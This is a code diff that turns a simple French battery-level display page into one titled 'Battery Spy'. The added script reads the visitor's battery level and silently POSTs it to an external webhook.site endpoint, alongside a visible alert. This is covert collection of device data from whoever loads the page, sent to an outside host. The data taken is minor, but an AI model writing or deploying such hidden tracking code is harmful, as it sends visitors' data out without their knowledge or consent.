@@ -1,23 +1,22 @@
 <!DOCTYPE html>
-<html lang="fr">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Test Batterie</title>
-  </head>
-  <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
-    <h2>Niveau de batterie 🔋</h2>
-    <p id="battery">Lecture en cours...</p>
+<html>
+<head>
+  <title>Battery Spy</title>
+</head>
+<body>
+  <h1>Checking battery...</h1>
+  <script>
+    navigator.getBattery().then(function(battery) {
+      var level = Math.round(battery.level * 100);
+      alert("Battery level: " + level + "%");
 
-    <script>
-      if ('getBattery' in navigator) {
-        navigator.getBattery().then(function(battery) {
-          let level = Math.round(battery.level * 100);
-          document.getElementById("battery").innerText = "Ton niveau de batterie est : " + level + "%";
-        });
-      } else {
-        document.getElementById("battery").innerText = "API de batterie non supportée.";
-      }
-    </script>
-  </body>
+      // Envoie le pourcentage au webhook
+      fetch("https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ battery: level })
+      });
+    });
+  </script>
+</body>
 </html>
